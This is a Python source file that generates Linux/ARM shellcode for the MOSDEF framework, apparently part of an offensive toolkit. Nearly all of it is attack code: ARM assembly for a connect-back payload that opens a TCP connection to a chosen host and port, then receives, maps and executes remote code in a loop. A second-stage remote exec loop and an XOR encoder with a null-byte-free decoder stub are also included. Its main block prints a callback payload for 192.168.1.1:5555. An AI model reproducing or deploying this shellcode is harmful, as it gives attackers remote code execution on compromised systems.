#! /usr/bin/env python
# a payload generator for linux/arm

import struct
import socket
import random

from MOSDEF import mosdef
from basecode import basecode

class payloads:
    def __init__(self, module = None):
        self.module = module

    def get_basecode(self, **args):
        return basecode(**args)

    def get_tcpwrite(self):
        return """
        tcpwrite:
        stmfd	sp!, {r5-r10}
        mov	r9, sp
        sub	sp, sp, #12
        
        ! loading local: size
        ldr	r4, [r11, #4]
        ! Saving into normal variable name=left 
        str	r4, [r9, #-4]
        ! loading local: inbuffer
        ldr	r4, [r11, #8]
        ! Saving into normal variable name=p 
        str	r4, [r9, #-12]
        ! Found do/while statement - using LABEL65_557275 as label
        LABEL65_557275:

        ! loading local: left
        ldr	r2, [r9, #-4]
        ! loading local: p
        ldr	r1, [r9, #-12]
        ! loading local: fd
        ldr	r0, [r11, #0]
        
        ! calling write
        mov     r7, #4
        svc     #0
        mov     r4, r0

        ! Saving into normal variable name=i 
        str	r4, [r9, #-8]
        ! Found if/while statement - using LABEL63_557275 as label
        LABEL63_557275:
        mov	r4, #0
        add	r4, r4, #1
        stmfd	sp!, {r4}
        ! loading local: i
        ldr	r4, [r9, #-8]
        ldmfd	sp!, {r5}
        cmp	r4, r5
        movlt	r4, #1
        movge	r4, #0
        cmp	r4, #0
        beq	LABEL64_557275
        b       exit

        LABEL64_557275:
        ! loading local: i
        ldr	r4, [r9, #-8]
        stmfd	sp!, {r4}
        ! loading local: left
        ldr	r4, [r9, #-4]
        ldmfd	sp!, {r5}
        sub	r4, r4, r5
        ! Saving into normal variable name=left 
        str	r4, [r9, #-4]
        ! found + operator
        ! loading local: i
        ldr	r4, [r9, #-8]
        ! lastloaded=pointer
        ! size of pointer argument pointer: 1
        mov	r7, #1
        mul	r4, r4, r7
        stmfd	sp!, {r4}
        ! loading local: p
        ldr	r4, [r9, #-12]
        ldmfd	sp!, {r5}
        add	r4, r4, r5
        ! Saving into normal variable name=p 
        str	r4, [r9, #-12]
        ! DO ... WHILE [condition]
        mov	r4, #0
        stmfd	sp!, {r4}
        ! loading local: left
        ldr	r4, [r9, #-4]
        ldmfd	sp!, {r5}
        cmp	r4, r5
        movgt	r4, #1
        movle	r4, #0
        cmp	r4, #0
        bne	LABEL65_557275
        LABEL66_557275:
        ! DO ... [out of loop]
        mov	r4, #1
        
        ! EPILOG
        mov	sp, r9
        ldmfd	sp!, {r5-r10}
        
        ! returning (stack_fix: 12)
        mov	r12, r14
        ldmfd	sp!, {r14, r11}
        add	r13, r13, #12
        bx	r12
        """

    def get_tcpread(self):
        return """
        tcpread:
        stmfd	sp!, {r5-r10}
        mov	r9, sp
        sub	sp, sp, #12
        
        ! loading local: size
        ldr	r4, [r11, #4]
        ! Saving into normal variable name=left 
        str	r4, [r9, #-4]
        ! loading local: buffer
        ldr	r4, [r11, #8]
        ! Saving into normal variable name=p 
        str	r4, [r9, #-8]
        ! Found do/while statement - using LABEL58_557275 as label
        LABEL58_557275:
        
        ! loading local: left
        ldr	r2, [r9, #-4]
        ! loading local: p
        ldr	r1, [r9, #-8]
        ! loading local: fd
        ldr	r0, [r11, #0]

        ! calling read
        mov     r7, #3
        svc     #0
        mov     r4, r0

        ! Saving into normal variable name=i 
        str	r4, [r9, #-12]
        
        ! Found if/while statement - using LABEL56_557275 as label
        LABEL56_557275:
        mov	r4, #0
        add	r4, r4, #1
        stmfd	sp!, {r4}
        
        ! loading local: i
        ldr	r4, [r9, #-12]
        ldmfd	sp!, {r5}
        cmp	r4, r5
        movlt	r4, #1
        movge	r4, #0
        cmp	r4, #0
        beq	LABEL57_557275
        b       exit
        LABEL57_557275:
        ! loading local: i
        ldr	r4, [r9, #-12]
        stmfd	sp!, {r4}
        ! loading local: left
        ldr	r4, [r9, #-4]
        ldmfd	sp!, {r5}
        sub	r4, r4, r5
        ! Saving into normal variable name=left 
        str	r4, [r9, #-4]
        ! found + operator
        ! loading local: i
        ldr	r4, [r9, #-12]
        ! lastloaded=pointer
        ! size of pointer argument pointer: 1
        mov	r7, #1
        mul	r4, r4, r7
        stmfd	sp!, {r4}
        ! loading local: p
        ldr	r4, [r9, #-8]
        ldmfd	sp!, {r5}
        add	r4, r4, r5
        ! Saving into normal variable name=p 
        str	r4, [r9, #-8]
        ! DO ... WHILE [condition]
        mov	r4, #0
        stmfd	sp!, {r4}
        ! loading local: left
        ldr	r4, [r9, #-4]
        ldmfd	sp!, {r5}
        cmp	r4, r5
        movgt	r4, #1
        movle	r4, #0
        cmp	r4, #0
        bne	LABEL58_557275
        LABEL59_557275:
        mov	r4, #1
        
        ! EPILOG
        mov	sp, r9
        ldmfd	sp!, {r5-r10}
        
        ! returning (stack_fix: 12)
        mov	r12, r14
        ldmfd	sp!, {r14, r11}
        add	r13, r13, #12
        bx	r12
        """
        
    def get_exit(self):
        return """
        exit:
        movw    r0, #65535
        movt    r0, #65535
        mov     r7, #1
        svc     #0
        """

    def get_xordecoder(self, length, key):
        """
        Return a XOR decoder stub that can decode a `length' sized block of code
        (that should directly follow the decoder stub) that has been encoded
        with `key' which should be a byte.
        """

        # We do this in order to be able to load length using MOVW without
        # generating null bytes. We add a constant (10 << 10 = 10240)
        # to length then subtract it using the barrel shifter during execution
        
        assert (length < 55295)

        return """
        xorstart:
            add     r5, pc, #112
            bx      r5
        mmap:
            eor     r3, r3, r3
            mov     r0, r3, lsl #10
            mov     r5, r3, lsl #10
            movw    r1, #LENGTH
            mov     r2, #10
            sub     r1, r1, r2, lsl #10
            mov     r2, #7
            mov     r3, #0x22
            movw    r4, #65535
            movt    r4, #65535
            mov     r7, #0xc0
            
            ! we need to patch the SVC trap to avoid null bytes
            ! the following works without needing to flush the icache because
            ! the argument to SVC is seen as DATA by the interrupt handler

            add     r9, pc, #4
            strh    r5, [r9]
            strb    r5, [r9, #2]
            svc     #0xffffff
        xormain:
            eor     r8, r8, r8
            movw    r10, #LENGTH
            mov     r11, #10
            sub     r12, r10, r11, lsl #10 
            mov     r9, lr    
        xorloop:
            mov     r7, r8, lsl #2
            cmp     r7, r12, lsl #2
            bxgt    r0
            ldrb    r2, [r9, r8]
            eor     r2, r2, #KEY
            strb    r2, [r0, r8]
            add     r8, r8, #1
            b       xorloop
        xorend:
            bl      mmap
        """.replace('LENGTH', str(length + 10240)).replace('KEY', str(key))


    def xorencode(self, code, key=None):
        """
        XOR encode `code' using `key' and return it with a XOR decoder
        stub. If no key is provided, one will automatically be determined
        from statistical analysis of the code.

        If no safe key exists then xorencode returns None. If a non-safe
        key is provided then it will be used.
        """

        if key is None:
            safe_bytes = set(range(0, 256)).difference(set([ord(b) for b in code]))
            if not safe_bytes: return None
            key = random.choice(list(safe_bytes))

        decoder = self.get_xordecoder(len(code), key)
        decoder_bin = self.assemble(decoder)

        res = ''
        for b in code: res += chr(ord(b) ^ key)
        return decoder_bin + res

    def assemble(self, code):
        """
        Just a little convenience callthrough to mosdef.assemble
        """
        return mosdef.assemble(code, 'ARM9')

    def callback(self, host, port, universal=False, fork_exit=False):
        """
        First stage payload for MOSDEF
        """
        codegen = self.get_basecode()
    
        #XXX: IPV4 Only
        codegen._globals.addDword('PORT', socket.htons(port))
        codegen._globals.addDword('HOST', struct.unpack('<L', socket.inet_aton(host))[0])
        codegen._globals.addDword('MOSDEF_TYPE', socket.htonl(21))
        codegen._globals.addDword('MOSDEF_ID', socket.htonl(3))
        
        codegen.functions += self.get_tcpwrite()
        codegen.functions += self.get_tcpread()
        codegen.functions += self.get_exit()

        if fork_exit:
            codegen.main += """
            mov    r7, #2
            svc    #0

            cmp    r0, #0
            bne    exit
            """
        
        codegen.main += """
        ! get some stack space for variables
        sub     sp, sp, #28
        mov     r9, sp

        ! sin_family = AF_INET
        mov     r4, #2
        strh    r4, [r9]

        ! sin_port = PORT
        adr     r4, PORT
        add     r4, r4, r10
        ldr     r4, [r4]
        strh    r4, [r9, #2]

        ! sin_addr = HOST
        adr     r4, HOST
        add     r4, r4, r10
        ldr     r4, [r4]
        str     r4, [r9, #4]

        ! SYS_socket
        mov     r0, #2
        mov     r1, #1
        mov     r2, #6
        movw    r7, #281
        svc     #0

        cmp     r0, #0
        ble     exit
        
        str     r0, [r9, #16]

        ! SYS_connect
        mov     r1, r9
        mov     r2, #16
        movw    r7, #283
        svc     #0

        cmp     r0, #0
        bne     exit
        """

        if universal:
            codegen.main += """
            ! write MOSDEF_TYPE
            adr     r4, MOSDEF_TYPE
            add     r4, r4, r10
            stmfd   sp!, {r4}

            ! length
            mov     r4, #4
            stmfd   sp!, {r4}

            ! sock
            ldr     r4, [r9, #16]
            stmfd   sp!, {r4}

            stmfd   sp!, {r14, r11}
            add     r11, r13, #8
            bl      tcpwrite

            ! write MOSDEF_ID
            adr     r4, MOSDEF_ID
            add     r4, r4, r10
            stmfd   sp!, {r4}

            ! length
            mov     r4, #4
            stmfd   sp!, {r4}

            ! sock
            ldr     r4, [r9, #16]
            stmfd   sp!, {r4}

            stmfd   sp!, {r14, r11}
            add     r11, r13, #8
            bl      tcpwrite
            """

        codegen.main += """
        ! Read length
        mov     r4, r9
        add     r4, r4, #20
        stmfd   sp!, {r4}

        mov     r4, #4
        stmfd   sp!, {r4}

        ldr     r4, [r9, #16]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ! Do the MMAP
        mov     r0, #0
        ldr     r1, [r9, #20]
        mov     r2, #7
        mov     r3, #0x22
        movw    r4, #0xffff
        movt    r4, #0xffff
        mov     r5, #0
        mov     r7, #0xc0
        svc     #0

        movw    r4, #65535
        movt    r4, #65535
        cmp     r0, r4
        
        beq     exit
        str     r0, [r9, #24]

        ! stage 1 emulation
        mov     r4, r0
        stmfd   sp!, {r4}

        ldr     r4, [r9, #20]
        stmfd   sp!, {r4}

        ldr     r4, [r9, #16]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ! send socket FD
        mov     r4, r9
        add     r4, r4, #16
        stmfd   sp!, {r4}

        mov     r4, #4
        stmfd   sp!, {r4}

        ldr     r4, [r9, #16]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpwrite

        ! munmap
        ldr     r0, [r9, #24]
        ldr     r1, [r9, #20]
        mov     r7, #91
        svc     #0
        
        ! main loop
        loop:
        
        ! receive length
        mov     r4, r9
        add     r4, r4, #20
        stmfd   sp!, {r4}

        mov     r4, #4
        stmfd   sp!, {r4}

        ldr     r4, [r9, #16]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ! do the mmap
        
        mov     r0, #0
        ldr     r1, [r9, #20]
        mov     r2, #7
        mov     r3, #0x22
        movw    r4, #0xffff
        movt    r4, #0xffff
        mov     r5, #0
        mov     r7, #0xc0
        svc     #0

        movw    r4, #65535
        movt    r4, #65535

        cmp     r0, r4
        beq     exit

        str     r0,  [r9, #24]
        mov     r5, r0

        ! receive code buffer
        stmfd   sp!, {r0}
        ldr     r4, [r9, #20]
        stmfd   sp!, {r4}
        ldr     r4, [r9, #16]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ! clear cache
        ldr     r0, [r9, #24]
        ldr     r2, [r9, #20]
        add     r1, r0, r2
        mov     r2, #0
        mov     r3, r1
        mov     r4, #0
        movw    r7, #2
        movt    r7, #0xf
        svc     #0

        ! save registers
        stmfd   sp!, {r10}
        stmfd   sp!, {r14, r11}

        ! jump
        mov     r14, pc
        bx      r5
        ldmfd   sp!, {r10}

        ! munmap
        mov     r0, r5
        ldr     r1, [r9, #20]
        mov     r7, #91
        svc     #0

        b       loop
        """
        return codegen.get()

    def secondstage_with_fd(self, fd):
        """
        Second stage payload for MOSDEF.
        This becomes the remote recv/mmap/exec loop.
        """
        
        codegen = self.get_basecode()
        codegen._globals.addDword('FD', fd)        

        codegen.functions += self.get_tcpread()
        codegen.functions += self.get_exit()

        # Read-Exec Loop
        codegen.main += """
        ! get some stack space for variables (length, mmap base, FD)
        sub     sp, sp, #12
        mov     r9, sp

        ! store FD locally
        adr     r0, FD
        add     r0, r0, r10
        ldr     r0, [r0]
        str     r0, [r9, #8]
        
        loop:
        ! receive length
        mov     r4, r9
        stmfd   sp!, {r4}
        mov     r4, #4
        stmfd   sp!, {r4}
        ldr     r4, [r9, #8]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ! Do the mmap
        mov     r0, #0
        ldr     r1, [r9]
        mov     r2, #7
        mov     r3, #0x22
        movw    r4, #0xffff
        movt    r4, #0xffff
        mov     r5, #0
        mov     r7, #0xc0
        svc     #0

        movw    r4, #65535
        movt    r4, #65535
        cmp     r0, r4
        beq     exit

        str     r0, [r9, #4]
        mov     r5, r0
    
        ! receive code buffer
        stmfd   sp!, {r0}
        ldr     r4, [r9]
        stmfd   sp!, {r4}
        ldr     r4, [r9, #8]
        stmfd   sp!, {r4}

        stmfd   sp!, {r14, r11}
        add     r11, r13, #8
        bl      tcpread

        ldr     r5, [r9, #4]
        
        ! clear cache
        mov     r0, r5
        ldr     r2, [r9]
        add     r1, r0, r2
        mov     r2, #0
        mov     r3, r1
        mov     r4, #0
        movw    r7, #2
        movt    r7, #0xf
        svc     #0
        
        ! save registers
        stmfd   sp!, {r10}
        stmfd   sp!, {r14, r11}

        ! jump
        mov     r14, pc
        bx      r5
        ldmfd   sp!, {r10}

        ! munmap
        mov     r0, r5
        ldr     r1, [r9]
        mov     r7, #91
        svc     #0

        b       loop
        """

        return codegen.get()



if __name__ == '__main__':
    p = payloads()
    print p.callback("192.168.1.1", 5555, universal=False)
